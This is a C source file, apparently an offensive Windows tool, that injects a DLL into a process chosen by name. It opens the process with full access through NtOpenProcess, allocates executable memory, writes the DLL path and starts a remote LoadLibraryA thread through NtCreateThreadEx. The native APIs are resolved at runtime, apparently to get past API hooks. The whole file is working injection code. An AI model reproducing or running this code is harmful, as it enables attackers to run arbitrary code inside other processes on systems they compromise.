#include <Windows.h>
#include <stdio.h>
#include "C:\Users\attacker\source\hiddenLib-main\info\info.h"
#include "listprocess.h"
#include "grim.h"

#define MAX_SIZE 1024

int main(int argc, char* argv[]) {
	if (argc < 3) {
		printf("%s %s <ProcessName> <Dll>", ERROR, argv[0]);
		return 1;
	}

	CHAR* cProcessName = argv[1];
	DWORD dwPid;
	HANDLE hProcess = NULL;
	LPCSTR lpDllName = argv[2];
	
	HMODULE hKernel32 = NULL;
	FARPROC fLoadLibraryAddress = NULL;
	FARPROC fAddressNtOpenProcess = NULL;
	
	HANDLE hThread = NULL;
	SIZE_T sNumberBytesWritten;
	OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL };
	CLIENT_ID ci = { NULL, NULL };
	NTSTATUS status;

	dwPid = ListProcess(cProcessName);

	/*==============================[START OF GET LOADLIBRARY ADDRESS]==============================*/
	hKernel32 = GetModuleHandleA("kernel32");
	if (hKernel32 == NULL) {
		printf("%s GetModuleHandle failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Get handle for KERNEL32 at address: 0x%p\n", SUCCESS, hKernel32);

	fLoadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryA");
	if (fLoadLibraryAddress == NULL) {
		printf("%s GetProcAddress failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Get address for LoadLibrary at: 0x%p\n", SUCCESS, fLoadLibraryAddress);
	/*==============================[END OF GET LOADLIBRARY ADDRESS]==============================*/

	/*==============================[START OF NTOPENPROCESS]==============================*/
	HANDLE hNtdll = GetModuleHandleA("ntdll");
	if (hNtdll == NULL) {
		printf("%s GetModuleHandle failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Get handle for NTDLL at address: 0x%p\n", SUCCESS, hNtdll);

	fAddressNtOpenProcess = GetProcAddress(hNtdll, "NtOpenProcess");
	if (fAddressNtOpenProcess == NULL) {
		printf("%s GetProcAddress failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Get address for  NtOpenProcess at: 0x%p\n", SUCCESS, fAddressNtOpenProcess);

	pNtOpenProcess customNtOpenProcess = (pNtOpenProcess)fAddressNtOpenProcess;

	ci.UniqueProcess = dwPid;
	status = customNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &ci);
	if (status != 0x0) {
		printf("%s customNtWriteVirtualMemory failed with error: 0x%x\n", ERROR, status);
		return 1;
	}
	printf("%s Successfully get handle for process %s at address: 0x%p\n", SUCCESS, cProcessName, hProcess);
	/*==============================[END OF NTOPENPROCESS]==============================*/
	
	/*==============================[START OF NTALLOCATEVIRTUALMEMORY]==============================*/
	FARPROC fAddressNtAllocateVirtualMemory;
	fAddressNtAllocateVirtualMemory = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	if (fAddressNtAllocateVirtualMemory == NULL) {
		printf("%s GetProcAddress failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Get address for  NtAllocateVirtualMemory at: 0x%p\n", SUCCESS, fAddressNtAllocateVirtualMemory);
	
	PVOID pBuffer = NULL;
	SIZE_T dwSize = strlen(lpDllName);
	
	pNtAllocateVirtualMemory customNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)fAddressNtAllocateVirtualMemory;
	status = customNtAllocateVirtualMemory(hProcess, &pBuffer, NULL, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (status != 0x0) {
		printf("%s customNtAllocateVirtualMemory failed with error: 0x%x\n", ERROR, status);
		return 1;
	}
	printf("%s Allocated memory at address: 0x%p\n", SUCCESS, pBuffer);
	/*==============================[END OF NTALLOCATEVIRTUALMEMORY]==============================*/

	/*==============================[START OF NTWRITEVIRTUALMEMORY]==============================*/
	FARPROC fAddressNtWriteVirtualMemory;
	fAddressNtWriteVirtualMemory = GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	if (fAddressNtWriteVirtualMemory == NULL) {
		printf("%s GetProcAddress failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Get address for  NtWriteVirtualMemory at: 0x%p\n", SUCCESS, fAddressNtWriteVirtualMemory);

	pNtWriteVirtualMemory customNtWriteVirtualMemory = (pNtWriteVirtualMemory)fAddressNtWriteVirtualMemory;
	status = customNtWriteVirtualMemory(hProcess, pBuffer, lpDllName, dwSize, &sNumberBytesWritten);
	if (status != 0x0) {
		printf("%s customNtWriteVirtualMemory failed with error: 0x%x\n", ERROR, status);
		return 1;
	}
	printf("%s Successfully writted %zu bytes in memory at address: 0x%p\n", SUCCESS, sNumberBytesWritten, pBuffer);
	/*==============================[END OF NTWRITEVIRTUALMEMORY]==============================*/

	/*==============================[START OF NTCREATETHREADEX]==============================*/
	FARPROC fAddressNtCreateThreadEx;
	fAddressNtCreateThreadEx = GetProcAddress(hNtdll, "NtCreateThreadEx");
	if (fAddressNtCreateThreadEx == NULL) {
		printf("%s GetProcAddress failed with error: 0x%x\n", ERROR, GetLastError());
		return 1;
	}
	printf("%s Get address for  NtCreateThreadEx at: 0x%p\n", SUCCESS, fAddressNtCreateThreadEx);

	pNtCreateThreadEx customNtCreateThreadEx = (pNtCreateThreadEx)fAddressNtCreateThreadEx;
	status = customNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &oa, hProcess, (LPTHREAD_START_ROUTINE)fLoadLibraryAddress, pBuffer, 0, NULL, NULL, NULL, NULL);
	if (status != 0x0) {
		printf("%s customNtCreateThreadEx failed with error: 0x%x\n", ERROR, status);
		return 1;
	}
	printf("%s Launched thread at address: 0x%p\n", SUCCESS, hThread);
	/*==============================[END OF NTCREATETHREADEX]==============================*/

	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	CloseHandle(hProcess);
	getchar();
	return 0;
}